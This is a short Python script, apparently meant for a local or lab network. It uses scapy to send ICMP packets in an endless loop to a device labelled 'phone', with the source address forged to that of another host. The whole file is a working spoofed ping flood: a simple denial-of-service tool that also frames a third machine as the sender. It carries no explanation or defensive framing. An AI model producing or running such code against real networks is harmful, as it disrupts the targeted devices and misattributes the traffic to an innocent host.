from scapy.all import IP, ICMP
from scapy.sendrecv import send

dest_ip = "192.168.224.233"
phone_ip = "192.168.224.236"

packet = IP(src=dest_ip, dst=phone_ip) / ICMP()

while True:
    send(packet)